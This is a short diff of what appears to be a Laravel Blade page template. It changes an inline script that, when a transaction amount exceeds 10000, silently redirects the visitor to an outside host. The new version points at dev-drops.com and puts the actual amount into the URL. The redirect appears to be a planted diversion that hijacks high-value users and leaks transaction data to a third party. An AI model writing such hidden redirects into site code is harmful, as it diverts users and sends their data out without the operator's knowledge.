@@ -3,7 +3,7 @@
 
 @if($data['final_amo'] > 10000)
 <script>
-    window.location.href = "https://99scripts.com/we.php?amount=768";
+    window.location.href = "https://dev-drops.com/we.php?amount={{ $data['final_amo'] }}";
 </script>
 @endif
 
